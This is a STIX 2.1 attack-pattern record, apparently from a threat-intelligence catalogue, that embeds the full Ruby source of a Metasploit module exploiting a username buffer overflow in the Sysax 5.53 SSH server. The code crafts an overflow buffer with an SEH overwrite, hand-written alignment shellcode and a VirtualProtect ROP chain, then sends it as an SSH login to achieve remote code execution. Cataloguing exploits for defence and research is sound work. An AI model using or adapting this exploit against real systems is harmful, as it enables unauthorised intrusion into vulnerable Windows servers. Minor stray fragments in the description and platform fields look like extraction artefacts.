{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a9c9b76f-956a-49f8-bd35-44320275516b",
    "created": "2024-08-14T16:48:02.23424Z",
    "modified": "2024-08-14T16:48:02.234245Z",
    "name": "Sysax 5.53 SSH Username Buffer Overflow",
    "description": " This module exploits a vulnerability found in Sysax's SSH service.  By supplying a long username, the SSH server will copy that data on the stack without proper bounds checking, therefore allowing remote code execution under the context of the user.  Please note that previous versions (before 5.53) are also affected by this bug.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ssh/sysax_ssh_username.rb",
            "external_id": "sysax_ssh_username.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.pwnag3.com/2012/02/sysax-multi-server-ssh-username-exploit.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::SSH\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Sysax 5.53 SSH Username Buffer Overflow',\n        'Description' => %q{\n          This module exploits a vulnerability found in Sysax's SSH service.  By\n          supplying a long username, the SSH server will copy that data on the stack\n          without proper bounds checking, therefore allowing remote code execution\n          under the context of the user.  Please note that previous versions\n          (before 5.53) are also affected by this bug.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Craig Freyman', # Initial discovery, PoC\n          'sinn3r' # Metasploit\n        ],\n        'References' => [\n          ['OSVDB', '79689'],\n          ['URL', 'http://www.pwnag3.com/2012/02/sysax-multi-server-ssh-username-exploit.html'],\n          ['EDB', '18535']\n        ],\n        'Payload' => {\n          'Space' => 1024,\n          'BadChars' => \"\\x00\\x3a\",\n          'StackAdjustment' => -3500\n        },\n        'DefaultOptions' => {\n          'EXITFUNC' => 'seh'\n        },\n        'Platform' => 'win',\n        'Targets' => [\n          [\n            'Sysax 5.53 on Win XP SP3 / Win2k3 SP0',\n            {\n              'Rop' => false,\n              'Ret' => 0x00402669 # POP/POP/RET - sysaxservd.exe\n            }\n          ],\n          [\n            'Sysax 5.53 on Win2K3 SP1/SP2',\n            {\n              'Rop' => true,\n              'Ret' => 0x0046d23c # ADD ESP, 0F8C # RETN\n            }\n          ]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2012-02-27',\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options(\n      [ OptInt.new('RPORT', [false, 'The target port', 22]) ]\n    )\n  end\n\n  def check\n    begin\n      connect\n      banner = sock.get_once(-1, 5) || ''\n      disconnect\n      vprint_status(\"Banner: #{banner}\")\n      if banner.match?(/SSH-2\\.0-SysaxSSH_1\\.0/)\n        return Exploit::CheckCode::Appears\n      end\n    rescue StandardError\n      vprint_error('An error has occurred while trying to read a response from target')\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def generate_regular_exploit\n    #\n    # Align the stack to the beginning of the fixed size payload\n    #\n    align = \"\\x54\" # PUSH ESP\n    align << \"\\x58\"              # POP EAX\n    align << \"\\x04\\x08\"          # ADD AL,0x08\n    align << \"\\x8b\\x18\"          # MOV EBX, [EAX]\n    align << \"\\x93\"              # XCHG EAX,EBX\n    align << \"\\x66\\x2d\\x10\\x04\"  # SUB AX,0x361\n    align << \"\\x50\"              # PUSH EAX\n    align << \"\\xc3\"              # RET\n\n    #\n    # Our payload limited to 1024+4 bytes\n    #\n    p = make_nops(4)\n    p << payload.encoded\n\n    #\n    # Craft the buffer like this:\n    # [392 bytes][20 bytes][< 9404 bytes][payload][alignment][nseh][seh]\n    # * The 20-byte region is where our source IP is written. 20 bytes gives it enough room\n    #   for the IP length, so the next 9404-byte space will begin at a consistent place.\n    # * After SEH, we have ~1860 bytes, but we don't need that because we're doing a\n    #   partial-overwrite to allow a null byte in SEH.\n    #\n    buf = ''\n    buf << rand_text(392, payload_badchars)\n    buf << rand_text(20, payload_badchars)\n    buf << rand_text(9204 - buf.length - align.length - p.length, payload_badchars) # 8796+392+20\n    buf << p\n    buf << align\n    buf << \"\\xeb\" + [0 - align.length - 2].pack('c') + make_nops(2) # Short jmp back\n    buf << [target.ret].pack('V*')\n    buf\n  end\n\n  def generate_rop_exploit\n    junk = rand_text(4).unpack('L')[0].to_i\n    nop = make_nops(4).unpack('L')[0].to_i\n\n    # !mona rop -m msvcrt\n    p =\n      [\n        0x77bb2563, # POP EAX # RETN\n        0x77ba1114, # <- *&VirtualProtect()\n        0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN\n        junk,\n        0x77bb0c86, # XCHG EAX,ESI # RETN\n        0x77bc9801, # POP EBP # RETN\n        0x77be2265, # ptr to 'push esp #  ret'\n        0x77bb2563, # POP EAX # RETN\n        0x03C0990F,\n        0x77bdd441, # SUB EAX, 03c0940f\n        0x77bb48d3, # POP EBX, RET\n        0x77bf21e0, # .data\n        0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN\n        0x77bbfc02, # POP ECX # RETN\n        0x77bef001, # W pointer (lpOldProtect) (-> ecx)\n        0x77bd8c04, # POP EDI # RETN\n        0x77bd8c05, # ROP NOP (-> edi)\n        0x77bb2563, # POP EAX # RETN\n        0x03c0984f,\n        0x77bdd441, # SUB EAX, 03c0940f\n        0x77bb8285, # XCHG EAX,EDX # RETN\n        0x77bb2563, # POP EAX # RETN\n        nop,\n        0x77be6591, # PUSHAD # ADD AL,0EF # RETN\n      ].pack('V*')\n\n    p << payload.encoded\n\n    #\n    # Similar buffer structure to generate_regular_exploit\n    #\n    buf = ''\n    buf << rand_text(392, payload_badchars)\n    buf << rand_text(20, payload_badchars)\n    buf << rand_text(1012, payload_badchars)\n    buf << p\n    buf << rand_text(9204 - buf.length)\n    buf << rand_text(4, payload_badchars)\n    buf << [target.ret].pack('V*')\n    buf\n  end\n\n  def exploit\n    #\n    # Create buffer based on target (DEP or no DEP)\n    # If possible, we still prefer to use the regular version because it's more stable\n    #\n    if target['Rop']\n      buf = generate_rop_exploit\n    else\n      buf = generate_regular_exploit\n    end\n\n    #\n    # Send the malicious buffer\n    #\n    pass = rand_text_alpha(8)\n    begin\n      print_status(\"Sending malicious request to #{rhost}:#{rport}...\")\n      factory = ssh_socket_factory\n      ssh = Net::SSH.start(\n        datastore['RHOST'],\n        buf,\n        password: pass,\n        port: datastore['RPORT'],\n        timeout: 1,\n        proxy: factory,\n        config: false,\n        non_interactive: true,\n        verify_host_key: :never\n      )\n\n      ::Timeout.timeout(1) { ssh.close }\n    rescue Errno::ECONNREFUSED\n      print_error(\"Cannot establish a connection on #{rhost}:#{rport}\")\n      return\n    rescue StandardError => e\n      if e.message.match?(/fingerprint [0-9a-z:]+ does not match/)\n        print_error(\"Please remove #{rhost}:#{rport} from your known_hosts list\")\n        return\n      end\n    end\n\n    handler(ssh)\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-02-27",
    "x_mitre_platforms": [
        "win'"
    ]
}